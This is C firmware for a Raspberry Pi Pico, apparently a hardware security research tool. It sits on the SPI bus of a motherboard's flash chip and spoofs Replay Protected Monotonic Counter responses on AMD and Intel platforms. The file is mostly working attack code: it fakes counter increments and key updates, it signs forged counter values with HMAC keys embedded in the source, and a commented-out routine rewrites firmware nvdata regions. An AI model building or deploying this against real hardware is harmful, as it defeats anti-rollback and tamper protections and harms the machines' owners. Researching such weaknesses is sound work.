#include <pico/stdlib.h>
#include <pico/binary_info.h>
#include <pico/multicore.h>
#include <hardware/clocks.h>
#include <mbedtls/md.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include "rpmc_sniffer.pio.h"
#include "psp_nvdata.h"

#define PIN_N_MUX_EN 17
bi_decl(bi_1pin_with_name(PIN_N_MUX_EN, "#MUX enable"));
#define PIN_MUX_INTERPOSE 16
bi_decl(bi_1pin_with_name(PIN_MUX_INTERPOSE, "MUX switch (0 is target, 1 is pico)"));

#define PIN_CHIP_VOLT_SEL 23
#define PIN_CHIP_VOLT_MODE 24

#define PIN_PICO_OUT_SPI_MOSI_DQ0 12
#define PIN_PICO_OUT_SPI_SCK 13
#define PIN_PICO_OUT_SPI_DQ2 14
#define PIN_PICO_OUT_SPI_CS 15
#define PIN_PICO_OUT_SPI_DQ3 21
#define PIN_PICO_OUT_SPI_MISO_DQ1 22

#define PIN_PICO_BOARD_SPI_MOSI_DQ0 1
#define PIN_PICO_BOARD_SPI_CLK 2
#define PIN_PICO_BOARD_SPI_HOLD_DQ3 3
#define PIN_PICO_BOARD_SPI_WP_DQ2 4
#define PIN_PICO_BOARD_SPI_MISO_DQ1 5
#define PIN_PICO_BOARD_SPI_CS 6

#define HMAC_KEY_SIZE 32

#define DEBUG

inline uint32_t reverse(const uint32_t x)
{
    return ((x & UINT32_C(0x0000'00FF)) << 24) |
           ((x & UINT32_C(0x0000'FF00)) <<  8) |
           ((x & UINT32_C(0x00FF'0000)) >>  8) |
           ((x & UINT32_C(0xFF00'0000)) >> 24); 
}

void interpose_amd(void)
{
    const static uint8_t status[] = {0xff, 0x00,
                                     0xff, 0x00,
                                     0xff, 0xff, 0x80,
                                     0xff, 0x00};
    const static size_t status_length[] = {2, 2, 2, 3, 2};
    
    gpio_put(PIN_MUX_INTERPOSE, 1);
    const uint8_t * status_pos = status;
    
    for (size_t counter = 0; counter < count_of(status_length); counter++) {
        amd_send(status_pos, status_length[counter]);
        status_pos += status_length[counter];
    }

    gpio_put(PIN_MUX_INTERPOSE, 0);

#ifdef DEBUG
    printf("interposed an increment\n");
#endif
}

static uint32_t counter_values[4] = {1446, 1442, 0, 0};
// Keys for key_data 01000000
#define USE_KEYS_FRAMEWORK_2
const static uint8_t hmac_keys[4 * HMAC_KEY_SIZE] = {
    # ifdef USE_KEYS_FRAMEWORK_1
    // Key slot 0
    0x70, 0xd1, 0x74, 0x19, 0x8c, 0x7d, 0x97, 0xf0,
    0x3a, 0xd2, 0x8b, 0xfc, 0x5d, 0x86, 0x30, 0xd7,
    0x8e, 0x3f, 0xa4, 0xbe, 0x56, 0x4a, 0x03, 0xd3,
    0xbd, 0x5d, 0x6b, 0x95, 0x3f, 0xa7, 0x18, 0x98,
    // Key slot 1
    0x1b, 0x57, 0xbe, 0x73, 0xb7, 0x48, 0xed, 0xc6,
    0x77, 0x02, 0xfb, 0xa0, 0x7b, 0xfb, 0xb2, 0x69,
    0xc7, 0x36, 0xe8, 0xc2, 0x95, 0x35, 0x4a, 0x98,
    0x8b, 0xc5, 0xff, 0x5a, 0xe7, 0x4c, 0x20, 0x89,
    // Key slot 2
    0x84, 0x35, 0xd3, 0xff, 0x92, 0x04, 0x75, 0xb4,
    0xb1, 0xc9, 0x4f, 0x21, 0x9c, 0x62, 0xa3, 0x54,
    0xea, 0x3a, 0x02, 0x9d, 0x2c, 0x30, 0xaa, 0xaa,
    0x2d, 0x25, 0x1e, 0x93, 0x74, 0x3e, 0x72, 0x9a,
    // Key slot 3
    0x4c, 0xfd, 0x6b, 0x7f, 0xbb, 0x05, 0xa6, 0xb4,
    0x6d, 0xf2, 0x35, 0x03, 0xb2, 0x30, 0x2d, 0xa9,
    0xfb, 0x59, 0xe7, 0x58, 0x2b, 0xa4, 0x2d, 0x5d,
    0x03, 0x74, 0x03, 0x92, 0x3e, 0x2f, 0xeb, 0x28
    #elifdef USE_KEYS_FRAMEWORK_2
    // Key Slot 0
    0xf4, 0x27, 0xad, 0xa3, 0x76, 0x79, 0x6f, 0x27,
    0x78, 0x10, 0x78, 0xb2, 0x0a, 0x6c, 0x68, 0x79,
    0x69, 0x3b, 0x90, 0x35, 0x1b, 0x99, 0x5a, 0xe5,
    0x3b, 0x7c, 0x6e, 0x14, 0x54, 0x6c, 0x69, 0xaa,
    // Key Slot 1
    0x1b, 0x3b, 0x9d, 0x0f, 0xd0, 0x78, 0xee, 0x45,
    0xc1, 0x28, 0xe3, 0xdb, 0x8d, 0x4d, 0xac, 0x6d,
    0x67, 0x21, 0x1a, 0xe6, 0xb6, 0x64, 0x43, 0x27,
    0x7e, 0x10, 0xcd, 0x62, 0x1b, 0x42, 0x08, 0x15,
    // Key Slot 2
    0x3d, 0xfd, 0x42, 0x26, 0x75, 0x56, 0x74, 0x73,
    0x2b, 0x72, 0x71, 0xb3, 0x59, 0xb1, 0xe9, 0x5c,
    0xd4, 0x8c, 0x8e, 0xf9, 0x55, 0x4f, 0xf2, 0x5d,
    0x5b, 0x25, 0x19, 0xc5, 0x24, 0x02, 0xe7, 0x68,
    // Key Slot 3
    0x5e, 0x7d, 0x55, 0xcd, 0x06, 0xbb, 0x1e, 0x07,
    0x91, 0xe6, 0x3b, 0xc3, 0x8a, 0x9b, 0xa0, 0xff,
    0x27, 0xd6, 0x3b, 0x75, 0x53, 0xdc, 0xf7, 0x0d,
    0x31, 0x4e, 0x83, 0xb6, 0x03, 0x6d, 0xaf, 0xa9
    #endif
};

const static uint32_t wait_msg[] = {0xffff0100};
const static uint32_t done_msg[13] = {[0 ... 12] = 0xffff80ff};


// the buffers' sizes must be 4-byte aligned
static_assert(sizeof(wait_msg) % 4 == 0);
static_assert(sizeof(done_msg) % 4 == 0);

void interpose_intel()
{
    struct rpmc_command_info info;
    info.dummy[0] = 0xFF; // done_msg[0];
    info.dummy[1] = 0xFF; // done_msg[1];

    while (true) {
        listen_for_op1(&info);

        #ifdef DEBUG
        printf("Received RPMC command %i\n", info.kind);
        #endif

        if (info.kind == INCREMENT) {
            listen_for_op2_and_mux();
            interposer_send_words((uint32_t *)wait_msg, 1);
            
            counter_values[info.increment.target] = info.increment.old_value + 1;

            // doesn't matter what we send here only first byte is valid anyways, intel just wants to do more work :)
            interposer_send_words((uint32_t *)done_msg, 1);
            interposer_send_words((uint32_t *)done_msg, 13);
            interposer_stop();

            #ifdef DEBUG
            printf("Increment %u from %u\n", info.increment.target, info.increment.old_value);
            #endif
        } else if (info.kind == GET) {
            listen_for_op2_and_mux();
            interposer_send_words((uint32_t *)wait_msg, 1);

            // we overwrite the counter address with its value, so we need to
            // calculate this before
            const uint8_t *key = hmac_keys + HMAC_KEY_SIZE * info.get.counter;
            const uint8_t target = info.get.counter;
            info.get.counter = reverse(counter_values[target]);
            mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256),
                            key,
                            HMAC_KEY_SIZE,
                            info.get.tag,
                            info.get.signature - info.get.tag,
                            info.get.signature);
            info.status = DONE;

            // send a short done first
            interposer_send_words((uint32_t *)done_msg, 1);

            size_t size = info.get.end - (uint8_t *)&info;
            static_assert(!(offsetof(struct rpmc_command_info, get.end) % 4));
            interposer_send((const uint8_t *)&info, size);

            interposer_stop();
            #ifdef DEBUG
            printf("Get %u returned %u\n", target, reverse(info.get.counter));
            #endif
        } else if (info.kind == UPDATE_HMAC_KEY) {
            listen_for_op2_and_mux();
            register const uint32_t * const m = done_msg;
            interposer_send_words(m, 1);
            interposer_send_words(m, 13);
            interposer_stop();

            #ifdef DEBUG
            printf("Updated %u with 0x%08x\n", info.update.counter, info.update.key_data);
            #endif
        }
    }
}

// #define FLASH_PAGE_SIZE         256
// #define FLASH_SECTOR_SIZE       4096

// static inline void cs_select(uint cs_pin) {
// 	asm volatile("nop \n nop \n nop"); // FIXME
// 	gpio_put(cs_pin, 0);
// 	asm volatile("nop \n nop \n nop"); // FIXME
// }

// static inline void cs_deselect(uint cs_pin) {
// 	asm volatile("nop \n nop \n nop"); // FIXME
// 	gpio_put(cs_pin, 1);
// 	asm volatile("nop \n nop \n nop"); // FIXME
// }

// uint8_t __time_critical_func(get_flash_status)(spi_inst_t *spi, uint cs_pin)
// {
//     cs_select(cs_pin);
//     uint8_t cmd[] = {
//         0x05, // Read Status Register
//         0
//     };
//     uint8_t out[sizeof(cmd)];
//     spi_write_read_blocking(spi, cmd, out, sizeof(cmd));
//     cs_deselect(cs_pin);

//     return out[1];
// }

// void __time_critical_func(flash_erase)(spi_inst_t *spi, uint cs_pin, uint32_t addr) {
// 	cs_select(cs_pin);
// 	const uint8_t cmdbuf[] = {
//         0x21, // 4-byte addres sector erase
//         addr >> 24,
//         addr >> 16,
//         addr >> 8,
//         addr
//     };

//     spi_write_blocking(spi, cmdbuf, sizeof(cmdbuf));
//     //spi_read_blocking(spi, 0, buf, len);
//     cs_deselect(cs_pin);
// }

// void __time_critical_func(flash_write)(spi_inst_t *spi, uint cs_pin, uint32_t addr, const uint8_t * buf, const size_t len) {
// 	cs_select(cs_pin);
// 	const uint8_t cmdbuf[] = {
// 		0x12, // 4-byte page program
//         addr >> 24,
// 		addr >> 16,
// 		addr >> 8,
// 		addr
// 	};

// 	spi_write_blocking(spi, cmdbuf, sizeof(cmdbuf));
// 	spi_write_blocking(spi, buf, len);
// 	cs_deselect(cs_pin);
// }

// void __time_critical_func(flash_write_enable)(spi_inst_t *spi, uint cs_pin) {
// 	cs_select(cs_pin);
// 	const uint8_t cmdbuf[] = {
// 		0x06, // flash write enable
// 	};

// 	spi_write_blocking(spi, cmdbuf, sizeof(cmdbuf));
// 	cs_deselect(cs_pin);
// }

// void __time_critical_func(flash_wait_done)(spi_inst_t *spi, uint cs_pin) {
//     while (get_flash_status(spi, cs_pin) != 0)
//         sleep_us(100);
// }

// void write_segment(spi_inst_t * const out_spi, const unsigned int cs, const uint32_t base_addres, const size_t len , const uint8_t data[len])
// {
//     for (uint32_t offset = 0; offset < len; offset += FLASH_PAGE_SIZE) {
//         const uint32_t target_addr = base_addres + offset;

//         if(target_addr % FLASH_SECTOR_SIZE == 0){
//             flash_write_enable(out_spi, cs);
//             sleep_us(100);
//             flash_erase(out_spi, cs, target_addr);
//             sleep_us(100);
//             flash_wait_done(out_spi, cs);
//             printf("flash_erase: %x\n", target_addr);
//         }

//         flash_write_enable(out_spi, cs);
//         sleep_us(100);
//         flash_write(out_spi, cs, target_addr, data + offset, MIN(len - offset, FLASH_PAGE_SIZE));
//         sleep_us(100);
//         flash_wait_done(out_spi, cs);
//         printf("flash_write: %x\n", target_addr);
//     }
// }

// void reprogram_flash(spi_inst_t * const out_spi, const unsigned int cs)
// {
//     write_segment(out_spi, cs, 0x10e0000, sizeof(psp_nvdata_bin), psp_nvdata_bin);
//     write_segment(out_spi, cs, 0x1100000, sizeof(psp_nvram_bin), psp_nvram_bin);
//     write_segment(out_spi, cs, 0x1060000, sizeof(nvrom_state_bin), nvrom_state_bin);

//     for (uint32_t start = 0x01102000; start  < 0x1100000 + 0x40000; start += FLASH_SECTOR_SIZE) {
//         flash_write_enable(out_spi, cs);
//         sleep_us(100);
//         flash_erase(out_spi, cs, start);
//         sleep_us(100);
//         flash_wait_done(out_spi, cs);
//         printf("flash_erase: %x\n", start);
//     }
// }

int main()
{
    stdio_init_all();
    // TODO: write loop um die flash region zu overwriten

    // init mux
    gpio_init_mask64((1 << PIN_N_MUX_EN) | (1 << PIN_MUX_INTERPOSE));
    gpio_put(PIN_N_MUX_EN, 1); // mux is active low
    gpio_set_slew_rate(PIN_MUX_INTERPOSE, GPIO_SLEW_RATE_FAST);
    gpio_set_dir_out_masked64((1 << PIN_N_MUX_EN) | (1 << PIN_MUX_INTERPOSE));

    // initialize voltage switcher
    gpio_init_mask64((1 << PIN_CHIP_VOLT_MODE) | (1 << PIN_CHIP_VOLT_SEL));
    gpio_put(PIN_CHIP_VOLT_MODE, 1); // enable switching voltage
    gpio_put(PIN_CHIP_VOLT_SEL, 1); // use target voltage
    gpio_set_dir_out_masked64((1 << PIN_CHIP_VOLT_MODE) | (1 << PIN_CHIP_VOLT_SEL));

    // setup capture spi
    gpio_init_mask64((1 << PIN_PICO_BOARD_SPI_MOSI_DQ0)
                      | (1 << PIN_PICO_BOARD_SPI_CLK)
                      | (1 << PIN_PICO_BOARD_SPI_HOLD_DQ3)
                      | (1 << PIN_PICO_BOARD_SPI_WP_DQ2)
                      | (1 << PIN_PICO_BOARD_SPI_MISO_DQ1)
                      | (1 << PIN_PICO_BOARD_SPI_CS));
    gpio_set_dir_in_masked64((1 << PIN_PICO_BOARD_SPI_MOSI_DQ0)
                      | (1 << PIN_PICO_BOARD_SPI_CLK)
                      | (1 << PIN_PICO_BOARD_SPI_HOLD_DQ3)
                      | (1 << PIN_PICO_BOARD_SPI_WP_DQ2)
                      | (1 << PIN_PICO_BOARD_SPI_MISO_DQ1)
                      | (1 << PIN_PICO_BOARD_SPI_CS));
    
    switch (getchar()) {
        case 'a':
            gpio_put(PIN_N_MUX_EN, 0);
            gpio_put(PIN_MUX_INTERPOSE, 0);
            amd_trigger_init(PIN_PICO_BOARD_SPI_CS, PIN_PICO_BOARD_SPI_CLK, PIN_PICO_BOARD_SPI_MOSI_DQ0);
            amd_interposer_init(PIN_PICO_OUT_SPI_CS, PIN_PICO_OUT_SPI_SCK, PIN_PICO_OUT_SPI_MISO_DQ1);
            
            printf("Interposing AMD\n");
            
            amd_trigger(interpose_amd);
            break;
        case 'i':
            gpio_put(PIN_N_MUX_EN, 0);
            gpio_put(PIN_MUX_INTERPOSE, 0);
            rpmc_sniffer_init(PIN_PICO_BOARD_SPI_CS, PIN_PICO_BOARD_SPI_CLK, PIN_PICO_BOARD_SPI_MOSI_DQ0, PIN_MUX_INTERPOSE);
            interposer_pio_init(PIN_PICO_OUT_SPI_CS, PIN_PICO_OUT_SPI_SCK, PIN_PICO_OUT_SPI_MISO_DQ1);
            
            printf("Interposing Intel\n");
            interpose_intel();
            break;
        // case 'r':
        //     //init_spi0_master();
            
        //     printf("Reprogramming flash sector\n");
        //     reprogram_flash(MASTER_SPI, PIN_CHIP_SPI_CS);
        //     break;
        default: // do nothing just leave chip directly connected
            gpio_put(PIN_N_MUX_EN, 0);
            gpio_put(PIN_MUX_INTERPOSE, 0);
            printf("Just passing traffic through\n");
            break;
    }

    while (true)
        tight_loop_contents();

    return 0;
}